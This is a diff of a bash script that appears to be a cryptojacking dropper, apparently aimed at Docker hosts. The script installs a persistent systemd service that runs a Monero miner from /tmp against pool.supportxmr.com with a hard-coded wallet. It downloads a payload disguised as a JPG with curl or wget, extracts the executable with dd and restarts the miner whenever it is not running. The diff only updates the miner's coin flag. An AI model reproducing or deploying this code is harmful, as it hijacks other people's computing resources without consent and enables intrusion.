@@ -1,14 +1,11 @@
 #!/bin/bash
-
 program_exists() {
     local ret='0'
     command -v $1 >/dev/null 2>&1 || { local ret='1'; }
-
     # fail on non-zero return value
     if [ "$ret" -ne 0 ]; then
         return 1
     fi
-
     return 0
 }
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
@@ -32,7 +29,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/tmp/rcupd --coin monero -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
+ExecStart=/tmp/rcupd --coin=XMR -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
 Restart=always
 RestartSec=20
 RestartPreventExitStatus=23
@@ -138,7 +135,7 @@ if [ ! -x "${he_save}" ]; then
     else
         (curl -fsSL ${he_32_url} -o ${he_save_jpg}||wget -q -O ${he_save_jpg} ${he_32_url}) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
     fi
-    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
+    ${he_save} --coin=XMR -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
 fi
 
 if [ -e "${he_save_jpg}" ]; then
@@ -147,7 +144,7 @@ fi
 
 process=$(/bin/ps auxf|grep -v grep|grep ${he_save}|wc -l)
 if [ ${process} == 0 ]; then 
-    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
+    ${he_save} --coin=XMR -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
 fi
 
 if [ -x "${he_save}" ]; then
